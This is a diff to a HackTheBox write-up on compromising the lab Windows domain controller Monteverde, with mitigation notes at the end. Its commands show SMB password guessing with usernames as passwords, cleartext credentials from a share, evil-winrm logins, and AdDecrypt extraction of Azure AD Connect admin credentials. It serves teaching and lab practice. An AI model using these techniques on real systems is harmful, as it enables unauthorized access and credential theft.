@@ -32,7 +32,7 @@ This is my write-up for the HackTheBox Windows machine _Monteverde_.
 
 ## User Flag
 
-My first step is to run my `nmap` scan. _Monteverde_ is running a lot of services, which may indicate a Active Directory DC. 
+Our first step is to run an `nmap` scan. _Monteverde_ is running a lot of services, which may indicate a Active Directory DC. 
 
 - __sC__: Enable common scripts
 
@@ -83,44 +83,44 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu May 28 15:10:35 2020 -- 1 IP address (1 host up) scanned in 315.60 seconds
 ```
 
-After the results come back, I also run a full port scan to see if any additional ports may be open. 
+After the results come back, we also run a full port scan to see if any additional ports may be open. 
 
 ```bash
 $ nmap -O -sV -sC -p- -oN full172.txt 10.10.10.172
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 ```
 
-The port that I make note of from the full scan is 5985. This tells me that the box is running `WinRM 2.0 (Microsoft Windows Remote Management)`. Once I find some credentials, I may be able to gain a foothold through this service.
+The port that we make note of from the full scan is 5985. This tells us that the box is running `WinRM 2.0 (Microsoft Windows Remote Management)`. Once we find some credentials, I may be able to gain a foothold through this service.
 
-Next, I run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.
+Next, we'll run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.
 
 ```bash
 $ enum4linux -U -o 10.10.10.169
 ```
 
-One of the most crucial items I receive from `enum4linux` are users on the system. Two users stand out and our not like the others: AAD__987d7f2f57d2 and SABatchJobs. 
+One of the most crucial items we receive from `enum4linux` are users on the system. Two users stand out and are not like the others: `AAD__987d7f2f57d2` and `SABatchJobs`. 
 
 ![](images/enum-users.png)
 
-More enumeration doesn't yield much information and I don't have any potential passwords. HackTheBox doesn't generally encourage bruteforcing credentials, so I decide to use the two usernames from earlier as their own passwords. 
+More enumeration doesn't yield much information and we don't have any potential passwords. HackTheBox doesn't generally encourage bruteforcing credentials, so we'll try to use the two usernames from earlier as their own passwords. 
 
-I have two potential services that accept logins, `SMB` and `WinRM`. I'll first try `SMB`. I can use `smbclient` to [enumerate shares](https://www.computerhope.com/unix/smbclien.htm) on _Monteverde_, but only if I have valid credentials. Fortunately, using the command and credentials below, I can sucessfully view the available shares.
+We have two potential services that accept logins, `SMB` and `WinRM`. We'll first try `SMB`. We can use `smbclient` to [enumerate shares](https://www.computerhope.com/unix/smbclien.htm) on _Monteverde_, but only if we have valid credentials. Fortunately, using the command and credentials below, we can sucessfully view the available shares.
 
 ```bash
 $ smbclient -L 10.10.10.172 -U SABatchJobs%SABatchJobs
 ```
 
-The available shared resources are displayed. I can now enumerate some of the file system. 
+The available shared resources are displayed. Let's enumerate some of the file system. 
 
 ![](images/shares.png)
 
-I connect to the various shares with `smbclient`.
+We'll connect to the various shares with `smbclient`.
 
 ```bash
 $ smbclient \\\\10.10.10.172\\users$ -U SABatchJobs%SABatchJob
 ```
 
-Within the `users$` share I find multiple user folders. As I poke around I discover that the user mhope has an interesting xml file. I retrieve it using the `get` command and find a password stored in cleartext.
+Within the `users$` share we find multiple user folders. With some poking around we discover that the user `mhope` has an interesting xml file. Using the `get` command, we can retrieve it. Opening it, we find a password stored in cleartext.
 
 ```xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
@@ -142,19 +142,19 @@ Within the `users$` share I find multiple user folders. As I poke around I disco
 
 I can only assume that this belongs to the user mhope. With luck, this user also uses the same password across services. I leave the shares behind for now and return to attempt remote access using `WinRM`. 
 
-With the help of `evil-winrm`, a Windows Remote Management tool for pentesting, I gain a foothold on the machine.
+With the help of `evil-winrm`, a Windows Remote Management tool for pentesting, we gain a foothold on the machine.
 
 ```bash
 $ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
 ```
 
-On the user's desktop, I find my first flag!
+On the user's desktop, we'll find our first flag!
 
 ![](images/user-flag.png)
 
 ## Root Flag
 
-Now that I have remote access to a user on the system, I need to see what permissions this account has and what groups they are apart of. I use the command `net user` to start.
+Now that we have remote access to a user on the system, we need to see what permissions this account has and what groups they are apart of. Let's use the command `net user` to start.
 
 ```powershell
 > net user mhope
@@ -162,20 +162,20 @@ Now that I have remote access to a user on the system, I need to see what permis
 Global Group memberships     *Azure Admins         *Domain Users
 ```
 
-I omitted some of the results, but it looks like the user mhope is apart of the `Azure Admins` group. After some research on a potential CVE, I found [this article](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), which provides great information on an exploit that allows a user to retrieve plaintext credentials of the privileged account being utilized by the Azure AD Connect.
+I omitted some of the results, but it looks like the user `mhope` is apart of the `Azure Admins` group. After some research on a potential CVE, we'll find [this article](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), which provides great information on an exploit that allows a user to retrieve plaintext credentials of the privileged account being utilized by the Azure AD Connect.
 
-I downloaded the two files `AdDecrypt.exe` and `mcrypt.dll` and uploaded them to _Monteverde_ using the built-in feature on `evil-winrm`.
+Let's download the two files `AdDecrypt.exe` and `mcrypt.dll` and uploaded them to _Monteverde_ using the built-in `upload` feature on `evil-winrm`.
 
 ![](images/uploads.png)
 
-Afterwards, I navigate to the `Microsoft Azure AD Sync\Bin` directory, and run the executable. 
+Afterwards, we'll navigate to the `Microsoft Azure AD Sync\Bin` directory, and run the executable. 
 
 ```powershell
 > cd “C:\Program Files\Microsoft Azure AD Sync\Bin”
 > C:\Users\mhope\AdDecrypt.exe -FullSQL
 ```
 
-Pretty quickly I receive credentials. Fortunately for me, they are for the administrator account!
+Pretty quickly we receive credentials. Fortunately for us, they are for the administrator account!
 
 ```
 ======================
@@ -196,13 +196,13 @@ Password: d0m@in4dminyeah!
 Domain: MEGABANK.LOCAL
 ```
 
-I once again connect to the machine, this time with my newly attained credentials.
+We can once again connect to the machine, this time with our newly attained credentials.
 
 ```bash
 $ evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
 ```
 
-I navigate to the Administrator desktop and collect the flag. _Monteverde_ rooted!
+Let's navigate to the Administrator desktop and collect the flag. _Monteverde_ rooted!
 
 ![](images/root-flag.png)
 
@@ -211,7 +211,7 @@ I navigate to the Administrator desktop and collect the flag. _Monteverde_ roote
 
 ### Mitigation
 
-- Don't use default or weak passwords, specifically, enforce strong policies, even on service accounts (especially on service accounts)
+- Don't use default or weak passwords, specifically, enforce strong policies, even on service accounts (especially on service accounts). Avoid using the same password across multiple services.
 
 - Patch management; Azure AD Connect should be updated when patches are available and proved stable. 
 
